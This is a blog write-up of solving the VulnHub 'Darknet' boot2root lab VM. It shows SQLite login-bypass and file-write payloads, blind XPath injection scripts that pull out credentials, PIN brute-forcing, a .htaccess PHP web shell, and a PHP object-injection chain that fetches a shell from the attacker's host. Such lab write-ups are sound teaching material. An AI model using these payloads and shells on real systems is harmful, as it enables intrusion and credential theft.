+++
categories = ['ctf', 'vulnerable vm', 'vulnhub', 'solution']
date = "2016-06-16T21:54:55+02:00"
description = ""
keywords = ['darknet', 'vulnhub', 'ctf', 'writeup']
title = "rooting darknet"

+++

Its been a while since I have done a vulnerable boot2root from [@VulnHub](https://twitter.com/vulnhub). So, I decided to pick up where I last left. After paging back from the latest VM's to where I roughly stopped last year, my attention was drawn to [Darknet](https://www.vulnhub.com/entry/darknet-10,120/) by [@Q3rv0](https://twitter.com/Q3rv0).

{{< figure src="/images/darknet_logo.png" >}}

This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.
<!--more-->

## getting started
Starting with these VM's is almost always the same story and Darknet was no different. Pick up the VM's IP address (yes, I still use the VMWare network sniffer `sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer -e vmnet8`). **192.168.252.140**. On to the `nmap`!

```
root@kali:~# nmap -v --reason 192.168.252.140 -sV

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-16 20:13 UTC

[...]

Reason: 998 resets
PORT    STATE SERVICE REASON         VERSION
80/tcp  open  http    syn-ack ttl 37 Apache httpd 2.2.22 ((Debian))
111/tcp open  rpcbind syn-ack ttl 37 2-4 (RPC #100000)
```

Just `tcp/80` to work with really. `tcp/111` did not yield anything interesting at first glance, but the most obvious next step was definitely the web port.

{{< figure src="/images/darknet_homepage.png" >}}

## 888.darknet.com
The homepage on the web server I have found so far was not very interesting. I scanned it with `gobuster` hoping to discover some more directories which revealed the existence of an `/access` folder.

```
root@kali:~# gobuster -u http://192.168.252.140/ -w /usr/share/wordlists/wfuzz/general/common.txt

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.252.140/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/wfuzz/general/common.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/access (Status: 301)
/index (Status: 200)
=====================================================
```

Browsing to http://192.168.252.140/access/ showed that directory indexing was enabled and revealed the `888.darknet.com.backup` file.

{{< figure src="/images/darknet_access_folder.png" >}}

Downloading and inspecting the file, it quickly became apparent that this looked like an [Apache Virtual Host](https://httpd.apache.org/docs/current/vhosts/examples.html) configuration.

```
root@kali:~/data/VulnHub/Darknet# cat 888.darknet.com.backup
<VirtualHost *:80>
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
</VirtualHost>
```

I immediately took this as a hint that I would have to hack an entry into my local `/etc/hosts` to resolve *888.darknet.com* to *192.168.252.140*. After having done that, we are presented with yet another page with a login.


{{< figure src="/images/darknet_888_login.png" >}}

## 888 authentication bypass
Natural instinct has it that when you see login pages like these, you just throw some single quotes at the fields to see what happens. I did exactly this and was pleasantly met with an error response along the lines of `unrecognized token: "3590cb8af0bbb9e78c343b52b93773c9"`. This just **screamed** SQL injection! I figured since it seems to be reflecting errors back at the page, `sqlmap` might just quickly sort out this stage for us without much effort. **Nope!** After quite a bit of time, I learnt that the SQL injection only appears to be in the `username` field, but no matter how I tried to get `sqlmap` to play along, I was inevitably met with `[WARNING] POST parameter 'username' is not injectable` every time.

Admitting defeat, I figured I should stop being lazy and attempt the injection manually. The fact that the error message returned `unrecognized token` hinted towards the fact that the backend database might be SQLite. This gives me a frame of reference for the SQL dialect to use. Next, the most critical step for the injection to be successful was to try and envision what the query must look like in the backend. I played around quite a bit more, and got he most information out of the error message when I have the value `'"1` as a username and any text as a password.

{{< figure src="/images/darknet_888_login_error.png" >}}

Great. So with `""1' and pass='03c7c0ace395d80182db07ae2c30f034'"` as the error message, I theorized that the SQL query might be something along the lines of:

```
SELECT * FROM users WHERE user='<INJECT>' and pass='<MD5 OF PASS>'
```

In the softwares logic then, there may be a requirement to just have a row return to mark the session as logged in. Makes sense right? :) So, in order to attempt an authentication bypass, I will need to try and get the query manipulated in such a way that the query will return a valid row regardless of the password. In SQL, we can have something like `SELECT 1` which will just return `1` in the row set.

```
root@kali:~/data/VulnHub/Darknet# sqlite3
SQLite version 3.8.10.2 2015-05-20 18:17:19
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> SELECT 1;
1
sqlite>
```

With this knowledge, we can imagine that we could have the final query the software will execute look something like this:

```
SELECT * FROM users WHERE user='a user' or '1' and pass='<MD5 OF PASS>'
```

In other words, if the injection point is in the `user` section, the payload we need to execute may be derived as follows:

`SELECT * FROM users WHERE user='` **a user' or '1** `' and pass='<MD5 OF PASS'>`

This obviously begs the requirement to have knowledge of a valid user! Well, remember that Apache Virtual host config file? It mentioned that the server admin is `devnull@darknet.com`. Admittedly, this took me a while to get to (and maybe a bit of a cheat :P), but using a username of `devnull` will complete the requirements we have to bypass the auth requirement for this page.

Considering the injection point and theorized query, we can use a username of `devnull' or 1'` and any password to login.

## administrator sql shell
After login bypass I was presented with page titled **Administrador SQL**.

{{< figure src="/images/darknet_888_administrator_sql.png" >}}

I tried a few queries but quickly realized that no output was returned no matter what you gave it.

While researching some of the possibilities with SQLite injection, I came across [this](http://gwae.trollab.org/sqlite-injection.html) blogpost that details a method of writing arbitrary code to a file of our choosing (obviously assuming we have write access there). Considering I had a fictitious *SQL shell* now, I jumped right into trying this.

My first target was finding a writable directory. The blogpost mentions that `uploads/` and `cache/` are usually good candidates (and rightfully so), but it did not seem like the paths existed at http://888.darknet.com/uploads/ and http://888.darknet.com/cache/. So I pulled up `gobuster` again to see if there are any other directories I could potentially use for this.

```
root@kali:~/data/VulnHub/Darknet# gobuster -u http://888.darknet.com/ -w /usr/share/wordlists/wfuzz/general/common.txt

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://888.darknet.com/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/wfuzz/general/common.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/css (Status: 301)
/img (Status: 301)
/includes (Status: 301)
=====================================================
```

3 hits for `/css`, `/img` and `/includes`. Considering I had the VirtualHost configuration file, I also knew that these paths are most probably relative to the DocumentRoot at `/home/devnull/public_html`. Now, all I had to do was modify the payload as explained in the blogpost and cross my fingers. Without boring you with the nitty gritty details, I finally managed to figure out that I can write to the `/img` directory and gain some code execution.

```
ATTACH DATABASE '/home/devnull/public_html/img/phpinfo.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ('<?php phpinfo(); ?>');
```

{{< figure src="/images/darknet_888_phpinfo.png" >}}

Yeah... look at that. The amount of `disable_functions` values explain why my initial `system()` type PHP shells were failing. Nonetheless, I was still able to browse the filesystem with a very rudementary script injected using the SQL shell I still had. The payload was as follows that allowed me to browse around and cat things.

```
ATTACH DATABASE '/home/devnull/public_html/img/files.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ("<?php if($_GET['a'] == 'ls') { print_r(scandir($_GET['p'])); } if($_GET['a'] == 'cat') { print_r(readfile($_GET['p'])); } ?>");
```

Looking at the `phpinfo()` output, I also noticed the `open_basedir` value was set to `/etc/apache2:/home/devnull:/tmp`. This is kinda what motivated me to slap together that quick file browsing script so that I can see whats so interesting in `/etc/apache2` (especially since we already had this one vhost config requirement to get to this stage).

Lastly, I also learnt that we are currently the `devnull` user on a Debian Linux box... Weird. I expected something like `www-data` but ok.

{{< figure src="/images/darknet_888_id.png" >}}

Getting back to the `/etc/apache2` thing, I found another VirtualHost configuration file there in `/etc/apache2/sites-available/`. This was done using the `files.php` script I wrote and toggling the `a` parameter to `ls` or `cat` as needed. I was not able to find anything else interesting thanks to that epic `open_basedir` setting :/

{{< figure src="/images/darknet_888_signal8.png" >}}

## signal8. so much hate.
I added another entry to my `/etc/hosts` and browsed to the new hostname discovered in that configuration file.

{{< figure src="/images/darknet_signal8_home.png" >}}

Poking around with the new website had a few points of interest but nothing that had any obvious bugs. The URL http://signal8.darknet.com/contact.php?id=1 had something funny going on with the `id` field though I could not confirm if this was another SQL injection bug or not. A `robots.txt` also existed for this site and had the entry `Disallow: /xpanel/`. Browsing to this I was met with a login page.

{{< figure src="/images/darknet_signal8_xpanel.png" >}}

The login page too did not seem to have any obvious bugs. Some quick scans with `nikto`, `sqlmap` etc did not show me anything I did not already know.

*fast forward many many hours*

Eventually, I resorted to fuzzing all of the fields in the new site that I have found. I literally tested all of them, but again let me not bore you with the failed attempts ;) I will however explain the general strategy.

I fired up BurpSuite, captured the request to http://signal8.darknet.com/contact.php?id=1 and sent it to Intruder.

{{< figure src="/images/darknet_signal8_fuzzing.png" >}}

Intruder was configured to use a simple fuzzing wordlist sourced from `/usr/share/wordlists/wfuzz/Injections/All_attack.txt`. Once the attack finished running, I went to the results and sorted them by response size. It was possible to quickly see those that returned an email address in the body and those that didn't based purely on the size. Using this list, I was able to filter out and realize that the payload of `count(/child::node())` managed to return a valid result.

{{< figure src="/images/darknet_signal8_xpath_discovery.png" >}}

The first time I saw this I had no idea how much time I would be spending on this particular bug. In fact, I have never come across this before so this was **by far** the most educational portion of the challenge for me!

## xpath injection
Just googling the term *count(/child::node())* quickly revealed that this was something that related to XPath. XPath allows you to query XML datasets much like SQL can query databases. Ok great. Next up was a trip to owasp.org and their article on [XPATH Injection](https://www.owasp.org/index.php/XPATH_Injection). I spent quite a bit of time researching this type of vulnerability. I realized that the case I was dealing with here was blind XPath injection. Much like blind SQL injection, blind XPath injection can also be exploited by running 'queries' that return true/false. The condition for true in this case was the fact that the email address appeared, and false was that it was missing from the response.

By far, [this](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf) PDF was the most useful in getting me to understand the vulnerability in the most depth.

Before I could exploit this bug though, I had to come up with a way to test the theories that I was reading about locally. To do this, I copied some XML that I found in one of the articles to start.

```
<?xml version="1.0" encoding="utf-8"?>
<Employees>
   <Employee ID="1">
      <FirstName>Arnold</FirstName>
      <LastName>Baker</LastName>
      <UserName>ABaker</UserName>
      <Password>SoSecret</Password>
      <Type>Admin</Type>
   </Employee>
   <Employee ID="2">
      <FirstName>Peter</FirstName>
      <LastName>Pan</LastName>
      <UserName>PPan</UserName>
      <Password>NotTelling</Password>
      <Type>User</Type>
   </Employee>
</Employees>
```

I then wrote a small PHP script that would allow me to test payloads as if it were injected into the XML on the site I have with the bug. This script looked as follows:

```
<?php

// Get the argument from the cli
$id = $argv[1];
$xpath = '//Employee[@ID=' . $id . ']/UserName';

// Be a little verbose about what the query will look like
print 'Injection    : ' . $id . PHP_EOL;
print 'Xpath        : ' . $xpath . PHP_EOL;
$xml = simplexml_load_file('test.xml');
print PHP_EOL;

// Run the XPath
$result = $xml->xpath($xpath);

// Return a result of the XPath was valid etc.
print 'Blind:' . PHP_EOL;
@print_r((string)$result[0]);

print PHP_EOL . PHP_EOL;

// Show the raw result of the XPath not filtered
print 'Raw:' . PHP_EOL;
print_r($result);
```

I studied some XPath functions available on [devdocs.io](http://devdocs.io/xslt_xpath-xpath-functions/). This reference together with what I read online as well as my small test scenario helped me figure that I could make use of the [starts-with()](http://devdocs.io/xslt_xpath/xpath/functions/starts-with) XPath function. This proved to work in my little test environment.

```
root@kali:~/data/VulnHub/Darknet# php readxml.php "1 and starts-with(name(*[1]),'F')=1"
Injection    : 1 and starts-with(name(*[1]),'F')=1
Xpath        : //Employee[@ID=1 and starts-with(name(*[1]),'F')=1]/UserName

Blind:
ABaker

Raw:
Array
(
    [0] => SimpleXMLElement Object
        (
            [0] => ABaker
        )

)
```

To test this scenario on Darknet, I took a guess at the node name of the field that is being returned as `email` considering its an email address that is being returned. It is possible to brute force these names as you will see later.
To start testing the feasibility of the blind boolean based injection, I entered the payload `1 and starts-with(email, 'e')` into the URL.

{{< figure src="/images/darknet_signal8_xpath_booltest.png" >}}

Boom. The email address is returned! This meant that I could run over a large key space and brute force other parts of the underlying XML, hoping to learn more of its structure. For clarities sake, the `starts-with()` function will later be expanded to be something like `1 and starts-with(email, 'errorlevel')`. Using the payload `2 and starts-with(email, 'd')` will also return the `devnull@darknet.com` email address as that email starts with `d` which makes the XPath query true.

I was not going to test all of these characters by hand, nope. I had to figure out what this XML looks like, so I wrote some scripts to help with that. The first script attempts to brute force the names of the current node as well as the parent node. If we have these names we can call them in an XPath query by name. For eg, `//parent/current/attribute`.

```
import requests
import string
import sys

entry_point = 'http://signal8.darknet.com/contact.php'

payloads = {
    # . == current node and .. == parent node
    'CurrentNode': '1 and starts-with(name(.),"{exfil}")=1',
    'ParentNode': '1 and starts-with(name(..),"{exfil}")=1',
}


def w(t):
    sys.stdout.write(t)
    sys.stdout.flush()


for payload_type, payload in payloads.iteritems():

    w("\n{}: ".format(payload_type))

    stop = False
    exfil = ''
    while not stop:

        stop = True

        for char in string.printable:
            r = requests.get(
                entry_point, params={
                    'id': payload.format(exfil=(exfil + char))
                })
            if 'darknet.com' in r.text:
                exfil += char
                w(char)
                stop = False

print "\nDone"
```

The script in action, determining that the XML has the structure `//auth/user`:
<script type="text/javascript" src="https://asciinema.org/a/ckyep1yvit8jxfo5fqbfxzn3u.js" id="asciicast-ckyep1yvit8jxfo5fqbfxzn3u" async></script>

I was now able to theorize that the XML may have the following structure when calling user information. `//auth/user[@id=1]/email` where `1` is the ID of the user in question. I knew about the `email` field as it was *almost* obvious. I also discovered the `username` field by guessing. I tried to apply the same brute force logic as I did to the values, but for some reason I was not getting any luck with payloads where I was trying to address attributes by position, such as with `[*1]` for the first. This did work in my local test environment but not on Darknet. I had everything I needed to get the credentials for login (I think?), but did not have the passwords.

Eventually I wrote another script to take some words from a wordlist and brute the attribute names, hoping to discover some more attributes!

```
import requests
import string
import sys

entry_point = 'http://signal8.darknet.com/contact.php'

payload = '1 and starts-with(name(//auth/user[id=1]/{word}),"{word}")=1'
with open('/usr/share/wfuzz/wordlist/general/spanish.txt') as f:
    for word in f.readlines():
        word = word.strip()
        r = requests.get(entry_point, params={'id': payload.format(word=word)})
        if 'darknet.com' in r.text:
            print 'Found attribute: {word}'.format(word=word)

```

Having noticed a large part of the sites have been in Spanish, I eventually used a Spanish wordlist and found the field name `clave` with it. Urgh, that was mildly frustrating. Anyways, this script in action:
<script type="text/javascript" src="https://asciinema.org/a/4fsl2fzb45yhpxxmr6ycwjpfe.js" id="asciicast-4fsl2fzb45yhpxxmr6ycwjpfe" async></script>

Finally. `username` & `clave`! As the final piece to this puzzle, I took the original script used to brute force the XML structure and modified the payloads to now brute the values for `username` and `clave`! The new payloads were:

```
'username': '1 and starts-with((//auth/user[id=1]/username),"{exfil}")=1',
'password': '1 and starts-with((//auth/user[id=1]/clave),"{exfil}")=1',
```

The brute force script in action with the new payloads:
<script type="text/javascript" src="https://asciinema.org/a/4obby2xqro3xo8gomfwh427mu.js" id="asciicast-4obby2xqro3xo8gomfwh427mu" async></script>

So the username and password combination that lets you login at http://signal8.darknet.com/xpanel/ is `errorlevel` / `tc65Igkq6DF`.

# the ploy
Once you have logged in, you presented with a page with a login to *Editor PHP*.

{{< figure src="/images/darknet_signal8_xpanel_loggedin.png" >}}

The link to `edit.php` had little value as it simply appeared to be a 'troll' page. I guess the humor here is the fact that code/os command execution has been relatively painful and this may have been a sign of hope.

{{< figure src="/images/darknet_signal8_xpanel_troll_edit.png" >}}

When I viewed the page sources for the page I got when I just logged it, I saw a hint to a `ploy.php` page.

{{< figure src="/images/darknet_signal8_xpanel_ploy.png" >}}

Browsing to `ploy.php`, I was met with a file upload and a series of checkboxes to tick.

{{< figure src="/images/darknet_signal8_xpanel_ploy_upload.png" >}}

It very quickly became obvious that you have to select the right combination of checkboxes in order to be allowed to upload anything. Each checkbox had a numeric value, so I copied this out into a script and proceeded to try all of the combinations possible. I knew a combination was correct if the Spanish term *Key incorrecta!* was not in the response. With some manual fiddling, I also learnt that the key was 4 integers long. Attempting a combination with more or less than 4 keys meant that the HTTP response had *La longitud de la clave no es la correcta!*

```
import requests
import itertools
import sys

VALUES = [37, 12, 59, 58, 72, 17, 22, 10, 99]
PIN = None

s = requests.Session()


def w(text):
    sys.stdout.write('\r' + text)
    sys.stdout.flush()


# Need a valid session before we can continue.
print('[+] Logging in')
s.post('http://signal8.darknet.com/xpanel/index.php', data={
    'username': 'errorlevel',
    'password': 'tc65Igkq6DF',
})

print('[+] Bruting PIN Code ...')
for c in itertools.permutations(VALUES, 4):
    w("{pin}".format(pin=', '.join(map(str, c))))
    r = s.post('http://signal8.darknet.com/xpanel/ploy.php',
               files={'imag': open('test_image.png', 'rb')},
               data={
                   'checkbox[]': c,
                   'Action': 'Upload',
               })

    if 'incorrecta' not in r.text:
        print('\n[+] Found pin: {pin}'.format(pin=', '.join(map(str, c))))
        break

```

Seeing this script in action would look as follows:
<script type="text/javascript" src="https://asciinema.org/a/13eq1usld7zxx2yoj55khbhwp.js" id="asciicast-13eq1usld7zxx2yoj55khbhwp" async></script>

So the pin code was `37, 10, 59, 17`. Easy.

The next obvious step was to try and figure out how we can weaponize this file upload, if at all. The file upload appeared to accept most uploads except for those ending in .php. Uploading a PHP script would return the error *Formato invalido!* Things like images (or almost anything that was not useful) responded with *Subida exitosa!*

I managed to discover a `uploads/` directory with `gobuster` again that helped me locate the uploaded files that I was uploading. The filenames appeared to remain intact which made things a little easier. But, this did not help me. I really hoped for some code execution.

*fast forward even more hours*

Eventually, I came across some PHP file upload bypass techniques that involve `.htaccess` files. The premise being that if its possible to write/overwrite a folders `.htaccess`, then it may be possible to [add a tiny backdoor shell](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html) to a folder. Sneaky! The only real requirement was that the VirtualHost configuration had to allow for `.htaccess` files to be read. As I had already downloaded the configuration file for signal8.darknet.com, I could quickly see that `AllowOverride` was set to `All`. Fantastic!

I picked a shell from the [https://github.com/wireghoul/htshells](https://github.com/wireghoul/htshells) repository [here](https://github.com/wireghoul/htshells/blob/master/shell/mod_php.shell.htaccess). From my previous testing, I wrote a small uploader so that I wouldn't have to click those checkboxes all the time.

```
import requests
import sys
import os.path as path

s = requests.Session()


def w(text):
    sys.stdout.write('\r' + text)
    sys.stdout.flush()


print('[+] Logging in ...')
s.post('http://signal8.darknet.com/xpanel/index.php', data={
    'username': 'errorlevel',
    'password': 'tc65Igkq6DF',
})

print('[+] Uploading : {file}'.format(file=sys.argv[1]))
r = s.post('http://signal8.darknet.com/xpanel/ploy.php',
           files={'imag': open(sys.argv[1], 'rb')},
           data={
               'checkbox[]': [37, 10, 59, 17],
               'Action': 'Upload',
           })

if 'Subida exitosa' in r.text:
    print('[+] Upload successful! Try: http://signal8.darknet'
          '.com/xpanel/uploads/{file}'.format(file=path.basename(sys.argv[1])))
elif 'Formato invalido' in r.text:
    print('[!] Upload failed. Invalid format.')
else:
    print('[!] Upload failed, unknown error.')
```

All I had to do was runt his script, providing the filename that I want to upload and viola.

```
root@kali:~/data/VulnHub/Darknet# python bruteUploader.py .htaccess
[+] Logging in ...
[+] Uploading : .htaccess
[+] Upload successful! Try: http://signal8.darknet.com/xpanel/uploads/.htaccess
```

Once uploaded, I browsed to the location and was met with what looks like some code execution again!

{{< figure src="/images/darknet_signal8_xpanel_shell.png" >}}

As expected, the OS command execution does not work due to all those `disable_functions`, but we have PHP code execution so that was a start! I decided that for this one I wanted to try get a more fully featured shell working. So, I edited the `.htaccess` to include a web shell that [I was working quite some time ago](https://gist.github.com/leonjza/8e9d16c84cf70014c4f36d8f95f9836e) (and finally kinda finished). I packed the shell and replaced the PHP in the `.htaccess` with the more fully featured shells packed source.

```
# <!--  Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
# Uncomment the line below for Apache2.4 and newer
# Require all granted
    Order allow,deny
    Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ###### --><?php eval(base64_decode("LONG BASE64 ENCODED STRING"));
```

Uploaded this with my upload helper and boom, a better shell.

{{< figure src="/images/darknet_signal8_xpanel_shell2.png" >}}

## the last hurdle(s)

Wtf. The current user is `errorlevel`... I double checked and saw that previously we were the `devnull` user. This had me pretty confused in the beginning and had me spend quite a bit of time to figure out how this is possible. From the `phpinfo()` output we had no `open_basedir` restriction so that allowed me to move around the filesystem much more freely than before. I also noticed that I am not able to access the home directory for the `errorlevel` user so I couldn't really figure out what was going on in there (the red color indicates read/write is not possible).

{{< figure src="/images/darknet_signal8_xpanel_homedirs.png" >}}

Eventually, I discovered the use of [suPHP](http://www.suphp.org/) as a loaded module. This basically means that the PHP script will run as the owner of the file. So with that theory, its sane to assume that because `errorlevel` owns the PHP files in the users home directory, that is why I am seen as that user too.

Anyways, some more enumeration later, I discover some more PHP scripts in `/var/www`. These were owned by `root`, meaning that if there are any vulnerabilities, I could effectively become root!

{{< figure src="/images/darknet_signal8_xpanel_var_www.png" >}}

Due to the fact that these were in `/var/www`, I could just browse to the IP address of the VM and run these scripts. Calling the `sec.php` script caused the server to return an HTTP 500 error.

{{< figure src="/images/darknet_sec_error.png" >}}

As I was able to read the files in `/var/www`, I also downloaded `sec.php` to get an idea of what its supposed to be doing.

```
<?php

require "Classes/Test.php";
require "Classes/Show.php";

if(!empty($_POST['test'])){
    $d=$_POST['test'];
    $j=unserialize($d);
    echo $j;
}
?>
```

The call to `unserialize()` immediately hinted me towards what the next step would need to be. I continued to download the files that are required in the `Classes/` folder.

Test.php
```
<?php

class Test {

    public $url;
    public $name_file;
    public $path;

    function __destruct(){
        $data=file_get_contents($this->url);
        $f=fopen($this->path."/".$this->name_file, "w");
        fwrite($f, $data);
        fclose($f);
        chmod($this->path."/".$this->name_file, 0644);
}
}

?>
```

Show.php
```
<?php

class Show {

    public $woot;

    function __toString(){
        return "Showme";        

}
    function Pwnme(){
        $this->woot="ROOT";

}

}

?>
```

A textbook example of [PHP Object Injection](https://www.owasp.org/index.php/PHP_Object_Injection)! I continued to serialize an instance of of the `Show` class by copying the class into a new PHP file, instantiating the `Show` class and running the `serialize()` function over it, printing the output.

```
// Source code for poishow.php
<?php

class Show {

    public $woot;

    function __toString(){
        return "Showme";

}
    function Pwnme(){
        $this->woot="ROOT";

}

}

print_r(serialize(new Show()));
```

Running this with a PHP interpreter printed the serialized string.

```
root@kali:~/data/VulnHub/Darknet# php poishow.php
O:4:"Show":1:{s:4:"woot";N;}
```

I now had something I could use to try and test the vulnerability. For the `Show` class, we are going to leverage the `__toString()` method defined when `sec.php` calls `echo` on the variable containing the unserialized object. I write *yet another python helper* to send the serialized objects to the `sec.php` as a POST parameter. This was mostly because I was too lazy to deal with my shell and escaping the quotes etc. :)

```
import requests

OBJECT = """O:4:"Show":1:{s:4:"woot";N;}"""

print('[+] Exploiting the PHP Object Injection Bug')
r = requests.post('http://192.168.252.140/sec.php', data={'test': OBJECT})
print r.status_code
print r.text
```

Running this made the server still respond with an HTTP 500 error. Hmm. I was stuck here for quite some time trying to figure out if I can get some form of logging somewhere that I can read. At some stage, I came across `/etc/suphp` and realized that the configuration file for it is writable.

{{< figure src="/images/darknet_signal8_xpanel_suphp_writable.png" >}}

The `suphp.conf` file had an entry `logfile=/var/log/suphp/suphp.log` which I changed to log to `/tmp`, hoping for it to reveal some information about the error code I was getting. To do this, I downloaded the file, modified the entry, and used my web shell's upload functionality to override the original configuration file. This worked just fine, apart from the fact that that logfile too was not readable by me :(

Some time later, I realized that there were two more configuration options in the configuration file that are of interest.

```
; Minimum UID
min_uid=100

; Minimum GID
min_gid=100
```

Remember that the PHP scripts we are trying to access are owned by `root`? Turns out that this is a security feature of [suPHP](http://www.suphp.org/) to prevent scripts with too high permissions to run. So, I modify the configuration file again to replace the values with `0` and upload it to override the original.

{{< figure src="/images/darknet_signal8_xpanel_suphp_override.png" >}}

This time, when I try and access the `sec.php` script, I am provided with no output. Great! Back to the original Object Injection that I was trying to exploit, I rerun my python script to test the `unserialize()`.

```
root@kali:~/data/VulnHub/Darknet# python phpObjectInjection.py
[+] Exploiting the PHP Object Injection Bug
200
Showme
```

The `Showme` output is expected as the `__toString()` method is set to return this when the class should be represented as a string. Neat.

The next step was then to serialize an object with my desired values for the `Test` class's properties. Following the logic of the `__destruct()` method, it was clear to see that it would call a URL, write the contents to file and chmod the file accordingly. To do this, I added the `Test` class and set the values in my original script.

```
<?php

class Show {

    public $woot;

    function __toString(){
        return "Showme";

}
    function Pwnme(){
        $this->woot="ROOT";

}

}

class Test {

    public $url;
    public $name_file;
    public $path;

    function __destruct(){
        # Commented out as this will run when this script
        # also finishes :D

        #$data=file_get_contents($this->url);
        #$f=fopen($this->path."/".$this->name_file, "w");
        #fwrite($f, $data);
        #fclose($f);
        #chmod($this->path."/".$this->name_file, 0644);
}
}


$test = new Test();
$test->url = 'http://192.168.252.1:8000/shell.txt';
$test->name_file = 'pop.php';
$test->path = '/var/www';

print_r(serialize([$test, new Show()]));
```

Running this would then print out the serialized versions of the two classes in question.

```
root@kali:~/data/VulnHub/Darknet# php poi.php
a:2:{i:0;O:4:"Test":3:{s:3:"url";s:35:"http://192.168.252.1:8000/shell.txt";s:9:"name_file";s:7:"pop.php";s:4:"path";s:8:"/var/www";}i:1;O:4:"Show":1:{s:4:"woot";N;}}
```

The only thing that is left to do is host the `shell.txt` file at the location specified in the `$url` property and run the little python helper with the new serialized string. I started up a HTTP server with `python -m SimpleHTTPServer` and wrote my web shell to `shell.txt`. The python helper was changed so that `OBJECT` had the new serialized string.

```
OBJECT = """a:2:{i:0;O:4:"Test":3:{s:3:"url";s:35:"http://192.168.252.1:8000/shell.txt";s:9:"name_file";s:7:"pop.php";s:4:"path";s:8:"/var/www";}i:1;O:4:"Show":1:{s:4:"woot";N;}}"""
```

I ran the helper and saw that the `shell.txt` was downloaded from my web server. I could now browse to http://192.168.252.140/pop.php :D

## flag
Using the shell uploaded, I was finally able to cat the flag!

{{< figure src="/images/darknet_flag.png" >}}

## final thoughts
I went back to a few of the source files to get an idea for whats going on once the box was rooted. The first being the weirdness when I tried to brute force the first elements of the node in the XPath injection. Turns out, a `preg_match()` was applied to filter out a few inputs.

```
if(!empty($_GET['id'])){
    $id=$_GET['id'];
    if(preg_match('/\*/', $id)){
        exit();
}
```

Next, the original SQL injection bug was also filtering out some input.

```
if(preg_match("/select|and|[>,=<\-;]/", $user)){
    echo "Ilegal";
    exit();
```

In the end, I learnt a lot! Thanks [@Q3rv0](https://twitter.com/Q3rv0)
